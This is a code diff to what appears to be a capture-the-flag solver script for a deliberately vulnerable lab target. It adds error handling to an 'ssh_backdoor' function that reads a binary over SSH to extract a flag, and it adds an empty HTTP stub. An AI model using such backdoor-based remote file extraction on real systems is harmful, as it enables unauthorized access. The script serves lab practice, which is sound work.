@@ -188,10 +188,15 @@ def ssh_backdoor():
     stdin, stdout, stderr = ssh.exec_command("xxd -p /passoire/my_own_cryptographic_algorithm")
     res, err = stdout.read(), stderr.read()
     result = res if res else err
-    res = result.decode(encoding="ascii")
-    res = hex_to_unicode(res[int(0x2180)*2+19:int(0x2180)*2+100])
-    flags['flag_11'] = res
-    print(f"Flag 11: {flags['flag_11']}")
+    if "No such file or directory" in result.decode(encoding="utf-8"):
+        print("\033[1;31mFlag 11 not found, might be deleted\033[0m")
+    elif "Permission denied" in result.decode(encoding="utf-8"):
+        print("\033[1;31mFlag 11 Permission denied\033[0m")
+    else:
+        res = result.decode(encoding="ascii")
+        res = hex_to_unicode(res[int(0x2180)*2+19:int(0x2180)*2+100])
+        flags['flag_11'] = res
+        print(f"Flag 11: {flags['flag_11']}")
     
     # ============================
     # Flag 12
@@ -236,6 +241,11 @@ def ssh_backdoor():
     
     ssh.close()
     return flags
+
+def http_get():
+    print("\033[1;32mTrying to get flags using HTTP GET...\033[0m")
+    # TODO
+    return {}
 
 def hex_to_unicode(hex_string):
     byte_data = bytes.fromhex(hex_string)
